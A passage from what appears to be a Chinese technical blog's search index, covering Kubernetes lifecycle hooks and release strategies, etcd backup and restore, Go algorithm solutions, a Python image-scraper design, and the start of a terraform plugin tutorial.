&quot;-c&quot;, &quot;echo Hello from the postStart handler &gt; /usr/share/message&quot;] HTTP GET 方式12345678lifecycle: postStart: httpGet: path: /healthz port: 8080 httpHeaders: - name: X-Custom-Header value: Awesome 配置示例livenessProbe 和 readinessProbe 的配置项完全相同，只是检查失败后的行为不同 lifecycle 的 exec 和 httpGet 和 livenessProbe 对应的配置项相同。 123456789101112131415161718192021222324252627282930apiVersion: v1kind: Podmetadata: name: examplespec: containers: - name: example // ... livenessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 5 periodSeconds: 10 readinessProbe: tcpSocket: port: 8080 initialDelaySeconds: 10 periodSeconds: 10 lifecycle: postStart: exec: command: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo Hello from the postStart handler &gt; /usr/share/message&quot;] preStop: httpGet: host: xxx.xxx.xxx path: /stop port: 8080 restartPolicy: OnFailure 参考Pod 生命周期：https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/ 健康检查和就绪检查：https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-probes/ 容器生存周期事件处理：https://kubernetes.io/docs/tasks/configure-pod-container/attach-handler-lifecycle-event/https://kubernetes.io/docs/concepts/containers/container-lifecycle-hooks/","link":"/hexo-blog/20180404/Kubernetes-容器生命周期管理/"},{"title":"有序数组的不同绝对值个数","text":"题目给定一个有序数组，求它的元素不同的绝对值个数。 比如 1[-3, -1, 0, 0, 1, 1, 2, 5] 返回 15 分析第一种方法首先一个循环将数组所有的负数转换为正数，然后对整个数组进行排序。 但循环一遍的时间复杂度为 O(n)，排序如果用堆排序，平均时间复杂度为 O(nlogn)，空间复杂度为 O(1)。因此整体的时间复杂度为 O(nlogn)，空间复杂度为 O(1)。而既然题目已经保证了有序数组，那有没有更快的方法呢？ 第二种方法我们可以用两个索引，索引 i 和 索引 j 分别从数组两端向中间移动，如果当前元素和下一个元素相等则跳过，如果右边的绝对值大于左边的绝对值，则索引 j 左移，如果左边的绝对值大于右边的绝对值，则索引 i 右移，如果两边绝对值相等，则索引同时左移和右移，每次移动计数加一。直到索引相遇时结束，如果相遇后索引刚好相等，则计数最后再加一。 这样时间复杂度就为 O(n)，空间复杂度为 O(1)。 实现使用 Golang 实现的源码如下： 123456789101112131415161718192021222324252627282930313233343536func getDistinctAbsCount(nums []int) int { i := 0 j := len(nums) - 1 count := 0 for i &lt; j { if i &lt; len(nums)-1 &amp;&amp; nums[i] == nums[i+1] { // skip duplicated i += 1 continue } if j &gt; 0 &amp;&amp; nums[j] == nums[j-1] { // skip duplicated j -= 1 continue } sum := nums[i] + nums[j] if sum &gt; 0 { // abs(nums[i]) &lt; abs(nums[j]) j -= 1 } else if sum &lt; 0 { // abs(nums[i]) &gt; abs(nums[j]) i += 1 } else { // abs(nums[i]) == abs(nums[j]) i += 1 j -= 1 } count += 1 } if i == j { count += 1 } return count} 可在这里在线运行：https://play.golang.org/p/lmOI5ZNkMNf","link":"/hexo-blog/20190523/有序数组的不同绝对值个数/"},{"title":"二叉树两个节点之间的最大距离","text":"题目给定一个二叉树，求它两个节点之间的最大距离。 比如二叉树： 12345 1 / \\ 2 3 / \\4 5 的最大距离为 3。 分析刚看到这个题目时有点懵，仔细分析了一下，求根节点为 Root 的二叉树中两个节点的最大距离，需要分两种情况考虑： 情况一如果最大距离经过了 Root，则最大距离： 1MaxDistance(root) = MaxDepth(root.Left) + MaxDepth(root.Right) + 2 假设 root 节点为 1，示例图为： 12345 1 // \\\\ 2 3// \\4 5 情况二如果最大距离没有经过 Root，则最大距离： 1MaxDistance(root) = max(MaxDistance(root.Left), MaxDistance(root.Right)) 假设 root 节点为 1，示例图为： 1234567 1 / 2 // \\\\ 3 4// \\\\5 6 想必大家已经通过公式看出规律来了，父节点的 maxDistance 可以通过两个子节点的 maxDistance 和 maxDepth 求出，合并 1 2 两种情况，最终的状态转移方程如下： 1MaxDistance(root) = max(max(MaxDistance(root.Left), MaxDistance(root.Right)), MaxDepth(root.Left) + MaxDepth(root.Right) + 2) 实现我们需要有个数据结构保存中间结果，即 maxDepth 和 maxDistance。 另外，这里我们确定 root 节点的深度为 0，因此将 nil 节点的深度初始化为 -1。 整个算法使用了递归方式。 123456789101112131415161718192021222324252627282930313233type TreeNode struct { Val int Left *TreeNode Right *TreeNode}type result struct { maxDepth int maxDistance int}func getMaxDistance(root *TreeNode) *result { if root == nil { return &amp;result{ maxDepth: -1, maxDistance: 0, } } left := getMaxDistance(root.Left) right := getMaxDistance(root.Right) maxDepth := max(left.maxDepth+1, right.maxDepth+1) maxDistance := max(max(left.maxDistance, right.maxDistance), left.maxDepth+right.maxDepth+2) return &amp;result{ maxDepth: maxDepth, maxDistance: maxDistance, }}func GetMaxDistance(root *TreeNode) int { result := getMaxDistance(root) return result.maxDistance} 可以在这里在线运行：https://play.golang.org/p/CwIvHaBJwP-","link":"/hexo-blog/20190523/二叉树两个节点之间的最大距离/"},{"title":"etcd 集群的备份和还原","text":"准备工作安装 etcdctl 方法1 1apt install etcd-client=3.2.17+dfsg-1 方法2 123456789export RELEASE=\"3.2.17\"test -d /tmp/etcd &amp;&amp; mkdir -p /tmp/etcd &amp;&amp; cd /tmp/etcdwget https://github.com/etcd-io/etcd/releases/download/v${RELEASE}/etcd-v${RELEASE}-linux-amd64.tar.gztar -zxvf etcd-v${RELEASE}-linux-amd64.tar.gzcd etcd-v${RELEASE}-linux-amd64cp etcdctl /usr/local/binetcdctl --version 方法3 使用 docker cp 从 etcd 容器中拷贝。 备份etcd 的备份有两种方式，选择其一即可。 方式一：使用 etcdctl snapshot 命令（推荐）在任何一个 member 节点执行： 1ETCDCTL_API=3 etcdctl snapshot save snapshot.db 方式二：拷贝 member/snap/db 文件1cp /var/lib/etcd/member/snap/db snapshot.db 如果使用此方法，etcdctl snapshot restore 时需要设置 --skip-hash-check=true 还原方式一：单节点还原成功后，再将其他节点加入集群根据 snapshot.db 生成新的 data dir： 1234567891011# restore.shrm /var/lib/etcd -rf ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \\ --name k8s-etcd-host1 \\ --data-dir /var/lib/etcd \\ --initial-cluster k8s-etcd-host1=http://host1:2380 \\ --initial-cluster-token k8s-etcd \\ --initial-advertise-peer-urls http://host1:2380 \\ --skip-hash-check=false 启动单实例： 12345678910111213spec: containers: - command: - etcd - --name=k8s-etcd-host1 - --initial-advertise-peer-urls=http://host1:2380 - --listen-peer-urls=http://host1:2380 - --listen-client-urls=http://0.0.0.0:2379 - --advertise-client-urls=http://host1:2379 - --data-dir=/var/lib/etcd - --initial-cluster-token=k8s-etcd - --initial-cluster=k8s-etcd-host1=http://host1:2380 - --initial-cluster-state=existing 将其他节点依次加入集群（先执行 add 命令再启动实例），add 命令如下： 1etcdctl member add k8s-etcd-host2 http://host2:2380 启动实例： 12345678910111213spec: containers: - command: - etcd - --name=k8s-etcd-host2 - --initial-advertise-peer-urls=http://host2:2380 - --listen-peer-urls=http://host2:2380 - --listen-client-urls=http://0.0.0.0:2379 - --advertise-client-urls=http://host2:2379 - --data-dir=/var/lib/etcd - --initial-cluster-token=k8s-etcd - --initial-cluster=k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380 - --initial-cluster-state=existing 其他实例操作方法类似。 方式二：同时还原多节点集群将 snapshot.db 文件拷贝至所有 etcd 节点，根据 snapshot.db 生成 data dir： 12345678910111213141516171819202122232425ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \\ --name k8s-etcd-host1 \\ --data-dir /var/lib/etcd \\ --initial-cluster k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380,k8s-etcd-host3=http://host3:2380 \\ --initial-cluster-token k8s-etcd \\ --initial-advertise-peer-urls http://host1:2380 \\ --skip-hash-check=false ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \\ --name k8s-etcd-host2 \\ --data-dir /var/lib/etcd \\ --initial-cluster k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380,k8s-etcd-host3=http://host3:2380 \\ --initial-cluster-token k8s-etcd \\ --initial-advertise-peer-urls http://host2:2380 \\ --skip-hash-check=false ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \\ --name k8s-etcd-host3 \\ --data-dir /var/lib/etcd \\ --initial-cluster k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380,k8s-etcd-host3=http://host3:2380 \\ --initial-cluster-token k8s-etcd \\ --initial-advertise-peer-urls http://host3:2380 \\ --skip-hash-check=false 还原后启动所有 etcd 实例 。启动参数如下，其他类似： 12345678910111213spec: containers: - command: - etcd - --name=k8s-etcd-host1 - --initial-advertise-peer-urls=http://host1:2380 - --listen-peer-urls=http://host1:2380 - --listen-client-urls=http://0.0.0.0:2379 - --advertise-client-urls=http://host1:2379 - --data-dir=/var/lib/etcd - --initial-cluster-token=k8s-etcd - --initial-cluster=k8s-etcd-host1=http://host1:2380,k8s-etcd-host2=http://host2:2380,k8s-etcd-host3=http://host3:2380 - --initial-cluster-state=existing 注意 启动 etcd 之前最好停掉 kube-apiserver 参考 https://coreos.com/etcd/docs/3.1.12/op-guide/recovery.html https://coreos.com/etcd/docs/latest/op-guide/runtime-configuration.html","link":"/hexo-blog/20180725/etcd-集群的备份和还原/"},{"title":"利用 Python 实现抓图程序","text":"这些天除了忙交大的复试，还一直忙于用 Python 编写抓图程序。好在前几天收到了短信，心总算放了下来，毕竟这一年在思过崖的面壁得到了回报。然而，在西安找实习工作时却处处碰壁，我想说考官大姐们你们可不能以貌取人啊，凭什么他比我帅你们就招他了……算了，不说了，男儿有泪不轻弹，只是未到桑心处。 程序的功能基本已经实现，可是原先仅仅考虑到抓一个网站的图片，当换一个网站，却又得重新编写 HTML 解析代码，好不麻烦。所以，便想着利用设计模式重构代码，使其可应用与大多数图片网站，甚至应用于视频网站。因为程序仍处于开发期，所以在此我并不能透漏具体要抓取的页面地址，实在抱歉。下面我们来看看该程序具体如何实现： 一、ImageLister 类首先，我设计了一个 ImageLister 类，主要负责解析 HTML 页面（依赖于 BeautifulSoup3），返回图片 URL，当页面有分页时，自动检测分页，顺序分析所有分页。类设计如图 1。 图 1 ImageLister 类的实现代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# imagelister.py# -*- coding: utf-8 -*-from BeautifulSoup import BeautifulSoupfrom urlparse import urljoinfrom re import subfrom ulib import uopen, ucloseclass ImageLister(object): def __init__(self, first_page): self.first_page = first_page self.title = \"\" self.info = \"\" self.pages = [] self.images = [] def getFirstPage(self): return self.first_page def getPages(self): return self.pages def getImages(self): self.images = self.anlzAllImageUrls() return self.images def getTitle(self): return self.title def getInfo(self): return self.info def getHtmlSrc(self, url): u = uopen(url) src = u.read() uclose(u) return src # 分析页面标题 def anlzTitle(self, data): soup = BeautifulSoup(data, fromEncoding=\"gb18030\") title = soup.html.head.title.string.strip() return title def anlzAllPageUrls(self): pass def anlzAllImageUrls(self): pass ImageListerA 类的实现代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# imagelistera.py# -*- coding: utf-8 -*-from imagelister import *class ImageListerA(ImageLister): def __init__(self, first_page): super(ImageListerA, self).__init__(first_page) data = self.getHtmlSrc(first_page) self.title = self.anlzTitle(data) self.info = self.anlzInfo(data) self.pages = self.anlzAllPageUrls(data, first_page) # 分析页面简介 # 该函数实现部分不必深究，具有页面特异性 def anlzInfo(self, data): soup = BeautifulSoup(data, fromEncoding=\"gb18030\") comment = soup.find(\"div\", {\"class\": \"comment2\"}) info = comment.find(\"span\", {\"class\": \"i_user\"}).string info += \"\\n\" contents = comment.find(\"font\", {\"color\": \"#999999\"}).contents for content in contents: temp_con = content.strip() info += sub(r\"&lt;br(\\s*\\/)?&gt;\", \"\\n\", temp_con) return info # 分析得到所有分页页面链接 # 该函数实现部分不必深究，具有页面特异性 def anlzAllPageUrls(self, data, first_page): soup = BeautifulSoup(data, fromEncoding=\"gb18030\") pagination = soup.find(\"div\", {\"id\": \"pagination\"}) alinks = pagination.findAll(\"a\")[1:-3] pages = [] pages.append(first_page) for alink in alinks: page = urljoin(first_page, alink[\"href\"]) pages.append(page) return pages # 分析所有分页得到所有图片链接 # 该函数实现部分不必深究，具有页面特异性 def anlzAllImageUrls(self): pages = self.pages images = [] for page in pages: u = uopen(page) data = u.read() soup = BeautifulSoup(data, fromEncoding=\"gb18030\") imglinks = soup.findAll(\"img\", {\"class\": \"IMG_show\"}) for imglink in imglinks: image = imglink[\"src\"] images.append(image) return images# 单元测试 onlyif __name__ == \"__main__\": lister = ImageListerA(\"**************************************.htm\") print lister.getTitle() print lister.getInfo() print lister.getPages() print \"\\n\".join(lister.getImages()) 同样地，ImageListerB 根据抓取网页的不同，而重写 ImageLister 中的方法，这样，换一个网站，只需要新创建一个继承于 ImageLister 的 ImageListerXXX 类，实现适合于该网站的 HTML 解析算法即可。 其中，ulib.py 是我自己写的库，提供了带重试功能的 url 访问函数以及其他的一些常用的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# -*- coding: utf-8 -*-# ulib.pyfrom urllib2 import urlopen, HTTPError, URLErrorfrom time import sleepdef uopen(url, verbose=True): retryTimes = 5 sleepTime = 10 while retryTimes &gt; 0: try: if verbose: print u\"正在读取：\", url u = urlopen(url) # 读取成功 if u.code == 200: return u elif u.code == 201: break except HTTPError, e: print e if e.code == 404: break except URLError, e: print e except BaseException, e: print e retryTimes -= 1 if verbose: print u\"读取失败，等待重试……\" sleep(sleepTime) return Nonedef uclose(u): u.close()# 格式化文件大小# 如 10 =&gt; \"10B\", 1024 =&gt; \"1KB\"...def formatSize(size): if size &gt; pow(1024, 2): new_size = size / pow(1024, 2) postfix = \"MB\" elif size &gt; 1024: new_size = size / 1024 postfix = \"KB\" else: new_size = size postfix = \"B\" strsize = \"%.2f\" % new_size return strsize + postfix 二、ImageCatcher 类ImageCatcher 类主要负责从 ImageLister 类得到图片 url，再将其存入本地（dirname = save_path + title），同时保存页面的地址（first_page）、标题（title）以及备注信息（info）。 ImageCatcher 类的实现代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175# -*- coding: utf-8 -*-# imagecatcher.pyimport osfrom time import clockimport urlparsefrom imagelistera import ImageListerAfrom ulib import uopen, uclose, formatSizeIMAGE_URL_FILE = \"image_urls.txt\"IMAGE_INFO_FILE = \"image_info.txt\"class ImageCatcher(object): def __init__(self, save_path, image_lister): self.image_lister = image_lister self.save_path = save_path self.first_page = image_lister.getFirstPage() self.title = image_lister.getTitle() self.info = image_lister.getInfo() self.dirname = os.path.join(save_path, self.title); self.__createDir(self.dirname, verbose=False) #print self.first_page print self.title #print self.info #print self.dirname self.downAllImages() # 创建图片文件夹 def __createDir(self, dirname, verbose=True): if not os.path.exists(dirname): os.makedirs(dirname) if verbose: print u\"已创建：%s\" % dirname return True else: if verbose: print u\"已存在：%s\" % dirname return False # 下载所有图片 def downAllImages(self, verbose=True): filename = os.path.join(self.dirname, IMAGE_URL_FILE) # 通过文件静态获取 if os.path.exists(filename): if verbose: print u\"已存在：%s\" % filename images = self.__readImageUrls(filename, verbose) # 远程读取 url，并保存至文件 else: images = self.__saveImageUrls(filename, verbose) self.images = images imageNum = len(images) i = 0 for image in images: i += 1 if verbose: print \"%d/%d\" % (i, imageNum) print image self.__saveImage(image) # 保存信息文件 filename = os.path.join(self.dirname, IMAGE_INFO_FILE) self.__saveInfo(filename, verbose) # 通过文件静态获取图片 URL def __readImageUrls(self, filename, verbose=True): f = open(filename, \"r\") images = [] for line in f: images.append(line.rstrip(\"\\n\")) f.close() if verbose: print u\"搜索到：%d 张\" % len(images) return images # 远程读取图片 URL，并保存至文件 def __saveImageUrls(self, filename, verbose=True): images = self.image_lister.getImages() if verbose: print u\"搜索到：%d 张\" % len(images) f = open(filename, \"w\") for image in images: f.write(image) f.write(\"\\n\") f.close() if verbose: print u\"已写入：%s\" % filename return images def __saveImage(self, url, verbose=True): basename = url.split(\"/\")[-1] dirname = self.dirname assert(os.path.exists(dirname)) filename = os.path.join(dirname, basename) file_size = 0 if os.path.exists(filename): print u\"文件已存在：%s\" % filename else: u = uopen(url) if u is None: return block_size = 8192 downloaded_size = 0 length = u.info().getheaders(\"Content-Length\") if length: file_size = int(length[0]) print u\"文件大小：%s\" % formatSize(file_size) f = open(filename, \"wb\") print u\"正在下载：%s\" % url start = clock() try: while True: buffer = u.read(block_size) if not buffer: # EOF break downloaded_size += len(buffer); f.write(buffer) # 显示下载进度 if file_size: print \"%2.1f%%\\r\" % (float(downloaded_size * 100) / file_size), else: print '...' except BaseException, e: print e f.close() if os.path.exists(filename): os.remove(filename) print u\"已删除损坏的文件：%s\", filename exit() finally: uclose(u) f.close() print u\"文件已保存：%s\" % os.path.abspath(filename) end = clock() spend = end - start print u\"耗时：%.2f 秒\" % spend print u\"平均速度：%.2fKB/s\" % (float(file_size) / 1024 / spend) # 保存信息文件 # 文件包括：url, title, info def __saveInfo(self, filename, verbose=True): if not os.path.exists(filename): info = self.image_lister.getInfo() f = open(filename, \"w\") f.write(self.first_page) f.write(\"\\n\") # 注意此处以将 Unicode 转换为 UTF-8 保存 if self.title: f.write(self.title.encode(\"utf-8\")) f.write(\"\\n\") if self.info: f.write(self.info.encode(\"utf-8\")) f.write(\"\\n\") if verbose: print u\"已写入：%s\" % filename return True else: if verbose: print u\"已存在：%s\" % filename return False # 单元测试 onlyif __name__ == \"__main__\": lister = ImageListerA(\"http://*************************************.htm\") #lister = ImageListerB(\"http://*************************************.htm\") ImageCatcher(\"pics\", lister) # \"pics\" 为相对路径 三、ulib 库ulib 是我自己实现 URL 处理库（多谢 ouats 的提醒），代码实现如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# -*- coding: utf-8 -*-import urllib2from urllib2 import Request, urlopen, HTTPError, URLErrorfrom time import sleepimport socketRETRY_TIMES = 5SLEEP_TIME = 10def uopen(url, headers={}, timeout=None, verbose=True): retryTimes = RETRY_TIMES sleepTime = SLEEP_TIME if headers: try: r = Request(url, headers=headers) u = urlopen(r) except HTTPError, e: print e print u\"服务器已禁止断点续传\" else: return u while retryTimes &gt; 0: try: u = urlopen(url) if verbose: print u\"正在连接：\", url # 连接成功 if u.code == 200: return u elif u.code == 201: break except HTTPError, e: print e if e.code == 404: break except URLError, e: print e except socket.timeout, e: print u\"连接超时，等待重试……\" except KeyboardInterrupt, e: print u\"用户强制中止\" exit() except BaseException, e: print e retryTimes -= 1 #if verbose: # print u\"读取失败，等待重试……\" try: # 少量多次，见机中止 while sleepTime &gt; 0: sleep(1) sleepTime -= 1 except KeyboardInterrupt, e: print u\"用户强制中止\" if retryTimes == 0: exit() return Nonedef uread(u): data = u.read() return datadef uclose(u): u.close()# 格式化文件大小# 如 10 =&gt; \"10B\", 1024 =&gt; \"1.00KB\"...def formatSize(size): if size &gt; pow(1024, 2): new_size = size / pow(1024, 2) postfix = \"MB\" elif size &gt; 1024: new_size = size / 1024 postfix = \"KB\" else: new_size = size postfix = \"B\" strsize = \"%.2f\" % new_size return strsize + postfixif __name__ == '__main__': # 单元测试 pass 注：在编写过程中，我一如既往地遇到了令人绝望的编码问题。我开发平台用的是 Windows 7，Python 2.7，折腾了好久，最后终于得到一个比较完美解决乱码问题的方法，即： 在程序中无论何时都使用 unicode 处理字符串，因为 BeautifulSoup3 默认返回 unicode，我们要做的只是给自己的字符串前加一个 ‘u’，然后尽情地使用 unicode 吧。 可以直接将 unicode 输出到 IDLE 或 cmd.exe，系统会自动转换为 gbk 输出（前提是你系统的代码页是 cp936 或 gbk）。 保存文本文件时，将 unicode 转换为 utf-8 存入，读取时，将 utf-8 转换为 unicode。 至于 linux 下，我还没有试过，改天测试一下。 （未完待续）","link":"/hexo-blog/20130401/利用-Python-实现抓图程序/"},{"title":"Kubernetes 服务灰度升级最佳实践","text":"本文主要介绍了 Deployment 和 StatefulSet 的升级机制和扩缩容机制，以及一些常用的配置项。并分别介绍了以这两种方式部署 Pod 时的对服务进行升级（包括滚动发布、蓝绿发布、灰度／金丝雀发布）的最佳实践。 Deployment升级机制RolloutDeployment 的 rollout 在 .spec.template 被修改时触发（比如镜像地址更新、Pod label 更新等等），其他修改（.spec.replicas 更新）不会触发。 更新时，k8s 通过计算 pod-template-hash，创建新的 ReplicaSet，由新的 rs 启动新的 Pod，不断替换旧 rs 的 Pod。 通过命令 1kubectl -n &lt;namespace&gt; rollout status deployment/&lt;deployment-name&gt; 查看 Deployment rollout 的状态。 .spec.strategy 定义了更新 Pod 的策略： 123456minReadySeconds: 5strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 1 spec.strategy.type 可以为 Recreate 或 RollingUpdate。Recreate 先删掉旧 Pod 再创建新 Pod，RollingUpdate 则按照滚动升级的策略来更新。 maxUnavailable：更新时，Deployment 确保不超过 25%（默认值） 的 Pod 处于 unavailable 状态。既可以是数量也可以是百分比，当 maxSurge 为 0 时 maxUnavailable 不能为 0。 maxSurge：更新时，Deployment 确保当前实际创建的 Pod 数（包括新旧实例总和）不超过期望 Pod 数的 25%（默认值）。既可以是数量也可以是百分比。 minReadySeconds：新创建的 Pod 变为 Ready 状态的最少时间，如果容器在该时间内没有 crash，则认为该 Pod 是 available 的。默认值为 0，表示一旦 readiness probe 通过后就变为 Ready，这时如果没有配置 readinessProbe，则只要 Pod 创建后就会为 Ready 状态，可能会导致服务不可用。 Rollover当 Deployment 在 rollout 过程中被更新时，Deployment 会立即执行新的更新，停止之前的 rollout 动作，并根据期望实例数删除（缩容）之前的 Pod，这个过程叫做 rollover。 Rollback获取 Deployment 的 rollout 历史，最新的 revision 即当前版本 1kubectl -n &lt;namespace&gt; rollout history deployment/&lt;deployment-name&gt; 查看指定 revision 的详细信息 1kubectl -n &lt;namespace&gt; rollout history deployment/&lt;deployment-name&gt; --revision=&lt;revision_num&gt; 回滚到上一个版本 1kubectl -n &lt;namespace&gt; rollout undo deployment/&lt;deployment-name&gt; 回滚到指定版本 1kubectl -n &lt;namespace&gt; rollout undo deployment/&lt;deployment-name&gt; --to-revision=&lt;revision_num&gt; 当 Deployment 回滚成功时，会生成 DeploymentRollback 事件 可以通过 .spec.revisionHistoryLimit 配置最多保留的 revision 历史个数（不包括当前版本），默认值为 2，即保留 3 个 revision。 Pause/Resume当 Deployment 的 .spec.paused = true 时，任何更新都不会被触发 rollout。通过如下命令设置 Deployment 为 paused： 1kubectl -n &lt;namespace&gt; rollout pause deployment/&lt;deployment-name&gt; 还原： 1kubectl -n &lt;namespace&gt; rollout resume deploy/&lt;deployment-name&gt; 扩缩容机制手动扩缩容可以通过修改 .spec.replicas，或者执行 kubectl 命令的方式对 Deployment 进行扩缩容： 1kubectl scale deployment nginx-deployment --replicas=10 自动扩缩容k8s 支持通过创建 HorizontalPodAutoscaler，根据 CPU 利用率或者服务提供的 metrics，对 Deployment、Replication Controller 或者 ReplicaSet 进行自动扩缩容。 1kubectl autoscale deployment nginx-deployment --min=10 --max=15 --cpu-percent=80 详细请参考： https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/ https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale-walkthrough/ 发布最佳实践滚动发布滚动发布是 Deployment 默认支持的更新方式，除了上文介绍的 rollingUpdate 相关配置外，不需要其他特殊的配置工作， 灰度／金丝雀发布金丝雀发布通过同时创建两个 Deployments 来实现，通过 track 标签区分两个版本，稳定版本的 Deployment 定义如下： 123456789name: frontendreplicas: 3...labels: app: guestbook tier: frontend track: stable...image: gb-frontend:v3 金丝雀版本的定义如下： 123456789name: frontend-canaryreplicas: 1...labels: app: guestbook tier: frontend track: canary...image: gb-frontend:v4 再配置 service 的 labelSelector 将流量同时导入两个版本的 Pod 123selector: app: guestbook tier: frontend 通过 .spec.replicas 数量和扩缩容机制可以灵活配置稳定版本和金丝雀版本的比例（上面的例子为 3:1），流量会按照这个比例转发至不同版本，一旦线上测试无误后，将 track = stable 的 Deployment 更新为新版本镜像，再删除 track = canary 的 Deployment 即可。 蓝绿发布与金丝雀发布类似，同时创建 2 个label 不同的 Deployment，例如，deployment-1 定义如下： 123456789name: frontendreplicas: 3...labels: app: guestbook tier: frontend version: v3...image: gb-frontend:v3 deployment-2 定义如下： 123456789name: frontendreplicas: 3...labels: app: guestbook tier: frontend version: v4...image: gb-frontend:v4 金丝雀发布通过修改 Deployment 的 replicas 数量和 Pod 镜像地址实现流量切换，而蓝绿发布通过修改 Service 的 labelSelector 实现流量切换。 原 service 定义如下： 1234selector: app: guestbook tier: frontend version: v3 切量时修改为： 1234selector: app: guestbook tier: frontend version: v4 StatefulSetStatefulSet 相对于 Deployment，具有以下特点： 稳定：唯一的 Pod 名称，唯一的网络ID，持久化存储 有序：部署和伸缩都按照顺序执行，滚动升级按照顺序执行 升级机制 .spec.updateStrategy 定义了升级 StatefulSet 的 Pod 的行为 .spec.updateStrategy.type 为 OnDelete （默认行为）时，用户手动删除 Pod 后，新的 Pod 才会创建；为 RollingUpdate 时，k8s 按照 {N-1 .. 0} 的顺序滚动更新每个 Pod。 .spec.updateStrategy.rollingUpdate.partition 可以实现灰度发布，当 StatefulSet 更新时，所有序号大于或等于 partition 的 Pod 会滚动更新；所有序号小于 partition 的 Pod 不会更新，即使被删掉，也会创建旧版本的 Pod。当 partition 大于 replicas 时，任何 Pod 都不会被更新。 配置示例如下： 123456spec: replicas: 10 updateStrategy: type: RollingUpdate rollingUpdate: partition: 7 # 7, 8, 9 will be rolling updated StatefulSet 也支持 kubectl rollout 命令，使用方法同 Deployment。 扩缩容机制可以通过 spec.podManagementPolicy 来配置 StatefulSet 的扩缩容策略 12spec: podManagementPolicy: OrderdReady OrderedReady默认行为 扩容时，Pod 按照 {0 .. N-1} 依次创建，并且前一个 Running／Ready 之后，后一个才会创建 缩容时，Pod 按照 {N-1 .. 0} 依次删除，前一个完全删除之后，后一个才会开始删除 Parallel扩缩容时忽略顺序，并发创建或删除 注意，该配置仅仅对扩缩容（修改 replicas）的情况有效，升级 StatefulSet 时 k8s 依然按照次序来更新 Pod。 唯一网络 ID每个 Pod 都有唯一的 hostname，格式为 -，domain name 的格式为 ..svc.cluster.local，通过该 domain name 可以解析到 StatefulSet 下所有的 Pod。通过 -...svc.cluster.local 可以解析到指定 Pod。 稳定存储通过配置 StatefulSet 的 volumeClaimTemplates，k8s 会为每个 Pod 创建 PV 和 PVC 并绑定。当 Pod 删除时，对应的 PVC 不会被删除，当重新创建时，仍然会绑定到之前的 PV。 123456789volumeClaimTemplates:- metadata: name: www spec: accessModes: [ \"ReadWriteOnce\" ] storageClassName: \"my-storage-class\" resources: requests: storage: 1Gi 发布最佳实践滚动发布滚动发布需要配置 .spec.updateStrategy.type 为 RollingUpdate，StatefulSet 的默认行为是按照 {N-1 .. 0} 的顺序依次更新。 123spec: updateStrategy: type: RollingUpdate 蓝绿发布蓝绿发布与 Deployment 的方式相同，通过创建 2 个 StatefulSet，修改 Service 的方式实现切量。 灰度／金丝雀发布金丝雀发布通过修改 StatefulSet 的 .spec.updateStrategy.rollingUpdate.partition 的值来实现发布。 例如 replicas 为 10 时，Pod 的序号为 0 - 9，首先将 partition 设置为 7，再修改 StatefulSet 的 Pod template 配置，会依次触发 Pod 9, 8, 7 的滚动更新，Pod 0-6 依然维持老版本，此时老版本与旧版本的比例为 7:3。线上验证无误后，再将 partition 设置为 0，依次触发 Pod 6 - 0 的滚动更新，此时全部更新至新版本。 123456spec: replicas: 10 updateStrategy: type: RollingUpdate rollingUpdate: partition: 7 # 7, 8, 9 will be rolling updated Replication Controller （官方已不推荐使用）kubectl rolling-update 只适用于 Replication Controllers，已经被 Deployment 取代，在此不过多介绍。 https://kubernetes.io/docs/tasks/run-application/rolling-update-replication-controller/ 参考 Deployment：https://kubernetes.io/docs/concepts/workloads/controllers/deployment/ Deployment Rolling Update：https://tachingchen.com/blog/kubernetes-rolling-update-with-deployment/ 金丝雀部署：https://kubernetes.io/docs/concepts/cluster-administration/manage-deployment/#canary-deployments 微服务部署：蓝绿部署、滚动部署、灰度发布、金丝雀发布：https://www.jianshu.com/p/022685baba7d StatefulSet：https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/","link":"/hexo-blog/20180301/Kubernetes-服务灰度升级最佳实践/"},{"title":"从零开始实现一个 terraform plugin","text":"terraform 作为一个优秀的开源基础设施管理、构建工具，官方或第三方提供了很多 plugin 来对接各种云平台（IaaS）。然而在我们平时开发和测试过程中，需要使用内部的 IaaS 服务频繁创建和删除 VM，而目前人工操作的方式比较费时费力，且没有现成的 plugin 可以使用。为了更方便地利用 terraform 工具来对内部 IaaS 资源进行管理和操作，我们决定自己开发一个 terraform plugin。 定义 Provider Schema首先，我们定义入口文件 main.go： 123456789101112package mainimport ( \"github.com/hashicorp/terraform/plugin\" qvm \"qiniu.com/kirk-deploy/pkg/qvm/terraform\")func main() { plugin.Serve(&amp;plugin.ServeOpts{ ProviderFunc: qvm.Provider, })} 其中 qvm.Provider 函数负责创建一个 provider resource。 12345678910111213141516171819202122232425262728func Provider() terraform.ResourceProvider { return &amp;schema.Provider{ Schema: map[string]*schema.Schema{ \"url\": { Type: schema.TypeString, Optional: true, DefaultFunc: schema.EnvDefaultFunc(\"QVM_URL\", \"\"), Description: descriptions[\"url\"], }, \"ak\": { Type: schema.TypeString, Optional: true, DefaultFunc: schema.EnvDefaultFunc(\"QVM_AK\", \"\"), Description: descriptions[\"ak\"], }, \"sk\": { Type: 